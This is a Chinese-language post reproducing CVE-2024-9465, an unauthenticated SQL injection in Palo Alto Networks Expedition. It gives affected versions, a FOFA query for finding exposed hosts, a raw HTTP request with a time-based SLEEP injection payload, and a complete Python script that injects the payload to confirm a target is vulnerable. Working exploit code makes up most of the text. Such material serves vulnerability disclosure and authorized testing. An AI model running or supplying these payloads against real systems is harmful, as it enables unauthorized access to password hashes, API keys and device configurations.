# PAN未授权SQL注入漏洞复现(CVE-2024-9465)

Palo Alto Networks Expedition中存在的一个SQL注入漏洞POC及漏洞细节已经公开,该漏洞允许未经验证的攻击者获取Expedition数据库内容,例如密码哈希、用户名、设备配置和设备API密钥,利用这一点,攻击者还可以在Expedition 系统上创建和读取任意文件。

### 影响范围

Palo Alto Networks Expedition < 1.2.96

## fofa

```javascript
title="Expedition Project"
```

## poc

```javascript
POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

action=import&type=test&project=pandbRBAC&signatureid=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))test)
```

![image-20241012114501096](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121145181.png)

## python脚本

```python
#!/usr/bin/python3
import argparse
import requests
import urllib3
import sys
import time
urllib3.disable_warnings()


def create_checkpoint_table(url: str):
    print(f'[*] Creating Checkpoint database table...')
    data = {'action': 'get',
            'type': 'existing_ruleBases',
            'project': 'pandbRBAC',
            }
    r = requests.post(f'{url}/bin/configurations/parsers/Checkpoint/CHECKPOINT.php', data=data, verify=False, timeout=30)
    if r.status_code == 200 and 'ruleBasesNames' in r.text:
        print(f'[*] Successfully created the database table')
        return

    print(f'[-] Unexpected response creating table: {r.status_code}:{r.text}')
    sys.exit(1)


def inject_checkpoint_query(url: str):
    start_time = time.time()
    print(f'[*] Injecting 10 second sleep payload into database query...')
    data = {'action': 'import',
            'type': 'test',
            'project': 'pandbRBAC',
            'signatureid': '1 AND (SELECT 1234 FROM (SELECT(SLEEP(10)))horizon3)',
            }
    r = requests.post(f'{url}/bin/configurations/parsers/Checkpoint/CHECKPOINT.php', data=data, verify=False, timeout=30)
    execution_time = time.time() - start_time
    if r.status_code == 200 and execution_time > 9 and execution_time < 15:
        print(f'[*] Successfully sent injection payload!')
        print(f'[+] Target is vulnerable, request took {execution_time} seconds')
        return

    print(f'[-] Unexpected response sending injection payload: {r.status_code}:{r.text}')
    sys.exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The URL of the target', type=str, required=True)
    args = parser.parse_args()

    create_checkpoint_table(args.url)
    inject_checkpoint_query(args.url)

```



## 漏洞来源

- https://github.com/horizon3ai/CVE-2024-9465